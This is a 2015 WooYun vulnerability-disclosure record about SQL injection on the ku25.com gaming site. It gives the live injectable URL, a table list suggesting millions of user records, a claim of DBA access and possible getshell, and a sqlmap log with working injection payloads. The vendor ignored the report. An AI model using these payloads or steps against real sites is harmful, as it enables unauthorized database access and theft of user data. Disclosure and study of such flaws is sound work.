{"id": 67201, "wybug_id": "wooyun-2015-0144744", "wybug_title": "酷爱玩官网SQL注入300w用户信息泄露主站可getshell", "wybug_corp": "酷爱玩", "wybug_author": "路人甲", "wybug_date": "2015-10-04 14:42", "wybug_open_date": "2015-11-18 14:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["高危注入", "百万用户信心泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-04：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-11-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 酷爱玩官网SQL注入300w用户信息泄露 主站可getshell 详细说明：  注入点：http://www.ku25.com/common/check/get_pay_data.php?id=0【单引号直接报错】\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0''' at line 1\n【sqlmap截图】：\n\n【信息量请看图中箭头指出的部分（只查了当前数据库，还未跨库查询】\n\n用户量：加起来大约300w+|pre_common_member                     | 1453612 || pre_ucenter_members                  | 1453421 || pre_ucenter_members2                  | 592797  || pre_common_member2                    | 592583  || ku25_user_info                        | 472309  |订单：| ku25_pay_record                       | 118985  |【DBA权限】可getshell\n\n【数据库信息】\nDatabase: x25gbk+---------------------------------------+---------+| Table                                 | Entries |+---------------------------------------+---------+| pre_common_credit_rule_log            | 1536342 || pre_common_member                     | 1453612 || pre_ucenter_members                   | 1453421 || pre_home_notification                 | 1356783 || pre_common_member_profile             | 1351988 || pre_ucenter_memberfields              | 1338299 || pre_common_member_status              | 1337296 || pre_common_member_count               | 1337291 || pre_common_member_field_forum         | 1337261 || pre_common_member_field_home          | 1337258 || pre_common_onlinetime                 | 1189361 || ku25_batch_game_gift                  | 732255  || ku25_game_play_record                 | 685811  || pre_ucenter_members2                  | 592797  || pre_common_member2                    | 592583  || ku25_user_info                        | 472309  || ku25_get_gift_record                  | 342096  || pre_forum_statlog                     | 222743  || ku25_user_integral                    | 178915  || ku25_pay_record                       | 118985  || ku25_sign_record                      | 106343  || pre_forum_attachment                  | 64252   || pre_forum_attachment_unused           | 59237   || pre_common_district                   | 45051   || ku25_join_activity_record             | 39188   || pre_security_failedlog                | 30606   || pre_common_tagitem                    | 15780   || pre_forum_post                        | 6293    || pre_forum_threadlog                   | 6174    || pre_common_statuser                   | 4685    || pre_forum_thread                      | 4330    || ku25_area_serve                       | 3714    || ku25_game_gift                        | 3336    || ku25_activity                         | 2414    || pre_forum_threadpartake               | 2052    || pre_common_tag                        | 1812    || pre_forum_postlog                     | 1593    || pre_forum_modwork                     | 1537    || pre_forum_rsscache                    | 1427    || ku25_paw_protection_answer            | 1386    || pre_ucenter_pm_members                | 1381    || ku25_reward_record                    | 1118    || pre_common_stat                       | 1104    || pre_forum_threadimage                 | 1092    || hf_user                               | 1014    || ku25_app_fl_code                      | 930     || pre_common_regip                      | 916     || pre_ucenter_pm_indexes                | 908     || pre_forum_post_tableid                | 872     || pre_common_member_count_archive       | 800     || pre_common_member_field_forum_archive | 800     || pre_common_member_field_home_archive  | 800     || pre_common_member_profile_archive     | 800     || pre_common_member_status_archive      | 800     || pre_ucenter_pm_lists                  | 695     || pre_ucenter_notelist                  | 667     || pre_common_syscache                   | 627     || pre_forum_attachment_6                | 583     || pre_home_friend_request               | 566     || pre_forum_attachment_4                | 546     || pre_common_session                    | 502     || pre_forum_attachment_5                | 502     || pre_forum_attachment_1                | 496     || pre_forum_attachment_0                | 493     || pre_forum_attachment_8                | 492     || pre_forum_attachment_9                | 491     || pre_forum_attachment_7                | 487     || pre_forum_attachment_3                | 471     || pre_forum_threadmod                   | 456     || pre_forum_attachment_2                | 445     || pre_ucenter_newpm                     | 429     || pre_common_setting                    | 401     || hf_pay_order                          | 377     || pre_forum_forumfield                  | 336     || pre_forum_forum                       | 335     || tg_users_access                       | 272     || ku25_message_board                    | 224     || pre_home_poke                         | 215     || pre_home_pokearchive                  | 215     || ku25_game_gift_type                   | 211     || pre_security_evilpost                 | 192     || pre_common_block_item                 | 173     || pre_forum_threadclass                 | 160     || pre_common_template_block             | 158     || pre_common_member_archive             | 121     || tg_reg_users                          | 114     || pre_ucenter_pm_messages_1             | 104     || pre_common_block_style                | 103     || pre_ucenter_pm_messages_4             | 96      || pre_ucenter_pm_messages_6             | 96      || pre_ucenter_pm_messages_5             | 95      || pre_ucenter_pm_messages_3             | 91      || pre_common_stylevar                   | 90      || pre_ucenter_pm_messages_7             | 87      || pre_ucenter_pm_messages_8             | 87      || pre_ucenter_pm_messages_2             | 86      || pre_common_smiley                     | 85      || pre_ucenter_pm_messages_9             | 84      || pre_ucenter_pm_messages_0             | 82      || pre_home_follow                       | 71      || pre_common_admincp_perm               | 67      || ku25_news                             | 65      || pre_common_member_profile_setting     | 51      || ku25_product                          | 50      || pre_common_nav                        | 49      || ku25_friendly_link                    | 48      || ku25_sort_of_news                     | 43      || pre_common_pluginvar                  | 36      || pre_common_credit_rule                | 31      || pre_common_failedlogin                | 28      || pre_common_block                      | 26      || pre_ucenter_settings                  | 26      || tg_users_order                        | 24      || ku25_vip                              | 20      || pre_common_usergroup                  | 20      || pre_common_usergroup_field            | 20      || pre_forum_threaddisablepos            | 20      || pre_home_favorite                     | 20      || tg_userinfo                           | 19      || ku25_account                          | 18      || pre_common_block_pic                  | 18      || pre_common_cron                       | 18      || pre_common_searchindex                | 16      || ku25_reward                           | 15      || pre_common_myapp                      | 15      || pre_common_plugin                     | 15      || pre_home_click                        | 15      || ku25_product2                         | 14      || ku25_paw_protection_question          | 12      || pre_common_member_crime               | 11      || pre_common_relatedlink                | 11      || ku25_pay_ladder                       | 10      || pre_forum_medal                       | 10      || pre_common_advertisement              | 9       || pre_common_report                     | 8       || ku25_pay_grade                        | 7       || pre_common_admingroup                 | 7       || pre_common_word                       | 6       || pre_forum_typeoption                  | 6       || pre_common_admincp_group              | 5       || ku25_order_me                         | 4       || pre_common_credit_rule_log_field      | 4       || pre_common_diy_data                   | 4       || pre_forum_bbcode                      | 4       || pre_forum_onlinelist                  | 4       || pre_ucenter_admins                    | 4       || ku25_news_contents                    | 3       || pre_common_admincp_cmenu              | 3       || pre_forum_grouplevel                  | 3       || pre_forum_imagetype                   | 3       || ku25_connect_site                     | 2       || pre_common_patch                      | 2       || pre_common_style                      | 2       || pre_common_template                   | 2       || pre_common_word_type                  | 2       || pre_home_share                        | 2       || pre_ucenter_applications              | 2       || ku25_basic_set                        | 1       || ku25_news_class                       | 1       || ku25_player_game                      | 1       || pre_common_admincp_session            | 1       || pre_common_connect_guest              | 1       || pre_common_friendlink                 | 1       || pre_common_member_action_log          | 1       || pre_common_process                    | 1       || pre_forum_poststick                   | 1       || pre_ucenter_failedlogins              | 1       |\n   漏洞证明：  slqmap全过程\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutua consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not resposible for any misuse or damage caused by this program[*] starting at 12:30:11[12:30:11] [INFO] testing connection to the target URL[12:30:12] [INFO] testing if the target URL is stable. This can take a couple o seconds[12:30:13] [INFO] target URL is stable[12:30:13] [INFO] testing if GET parameter 'id' is dynamic[12:30:13] [WARNING] GET parameter 'id' does not appear dynamic[12:30:13] [INFO] heuristic (basic) test shows that GET parameter 'id' might beinjectable (possible DBMS: 'MySQL')[12:30:14] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vlnerable to XSS attacks[12:30:14] [INFO] testing for SQL injection on GET parameter 'id'heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do youwant to skip test payloads specific for other DBMSes? [Y/n]do you want to include all tests for 'MySQL' extending provided level (1) and rsk (1) values? [Y/n][12:31:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[12:31:01] [WARNING] reflective value(s) found and filtering out[12:31:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MyQL comment)'[12:31:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySL comment)'[12:31:07] [INFO] testing 'MySQL boolean-based blind - WHERE, HAVING, ORDER BYr GROUP BY clause (RLIKE)'[12:31:10] [INFO] GET parameter 'id' seems to be 'MySQL boolean-based blind - WERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)' injectable[12:31:10] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING claus'[12:31:10] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE o HAVING clause' injectable[12:31:10] [INFO] testing 'MySQL inline queries'[12:31:10] [INFO] testing 'MySQL > 5.0.11 stacked queries'[12:31:10] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'[12:31:10] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[12:31:10] [INFO] testing 'MySQL > 5.0.11 AND time-based blind (comment)'[12:31:11] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'[12:31:14] [INFO] GET parameter 'id' seems to be 'MySQL < 5.0.12 AND time-basedblind (heavy query)' injectable[12:31:14] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[12:31:14] [INFO] automatically extending ranges for UNION query injection techique tests as there is at least one other (potential) technique found[12:31:14] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extendinghe range for current UNION query injection technique test[12:31:15] [INFO] target URL appears to have 20 columns in queryinjection not exploitable with NULL values. Do you want to try with a random ineger value for option '--union-char'? [Y/n][12:32:22] [WARNING] if UNION based SQL injection is not detected, please consier forcing the back-end DBMS (e.g. '--dbms=mysql')[12:32:22] [INFO] testing 'MySQL UNION query (50) - 22 to 40 columns'[12:32:27] [INFO] testing 'MySQL UNION query (50) - 42 to 60 columns'[12:32:30] [INFO] testing 'MySQL UNION query (50) - 62 to 80 columns'[12:32:33] [INFO] testing 'MySQL UNION query (100) - 82 to 100 columns'[12:32:37] [INFO] testing 'Generic UNION query (50) - 1 to 20 columns'GET parameter 'id' is vulnerable. Do you want to keep testing the others (if an)? [y/N]sqlmap identified the following injection points with a total of 274 HTTP(s) reuests:---Parameter: id (GET)    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY claue (RLIKE)    Payload: id=0' RLIKE (SELECT (CASE WHEN (5850=5850) THEN 0 ELSE 0x28 END))ND 'ZdNf'='ZdNf    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: id=0' AND (SELECT 2122 FROM(SELECT COUNT(*),CONCAT(0x716b716b71,(SLECT (CASE WHEN (2122=2122) THEN 1 ELSE 0 END)),0x7171787871,FLOOR(RAND(0)*2))xFROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'jwoP'='jwoP    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: id=0' AND 6631=BENCHMARK(5000000,MD5(0x65464364)) AND 'Mdxp'='Mdxp---[12:33:06] [INFO] the back-end DBMS is MySQLweb server operating system: Linux CentOS 6.5web application technology: PHP 5.3.3, Apache 2.2.15back-end DBMS: MySQL 5.0\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}